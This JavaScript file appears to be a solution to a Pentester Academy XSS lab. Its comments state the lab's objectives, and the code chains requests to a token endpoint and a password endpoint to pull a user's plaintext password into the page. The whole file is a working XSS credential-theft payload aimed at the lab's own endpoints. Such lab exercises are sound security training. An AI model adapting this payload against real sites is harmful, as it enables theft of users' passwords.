// https://pentesteracademylab.appspot.com/lab/webapp/jfp/20

// Objectives:
//     Find John's Password using an XSS vulnerability on this page
//     Display the Password in the div with id "result"
//     App stores password in Plain Text :(
//     No Hardcoded values can be used - everything has to be figured out dynamically


let uid = document.getElementById('settings').textContent.split(':')[1];

let req1 = new XMLHttpRequest();
req1.open('GET', '/lab/webapp/jfp/20/gettoken?uid='+uid);
req1.responseType = 'json';
req1.send();

let req2 = new XMLHttpRequest();

req1.onreadystatechange = function (){
    if (this.readyState===4 && this.status===200){
        let token = req1.response['params']['token'];

        req2.open('GET', '/lab/webapp/jfp/20/getpassword?token='+token, true);
        req2.responseType = 'json';
        req2.send();
    }
}

req2.onreadystatechange = function (){
    if (this.readyState===4 && this.status===200){
        let password = req2.response['resp']['password'];
        alert(password);
        document.getElementById('result').innerHTML = password;
    }
}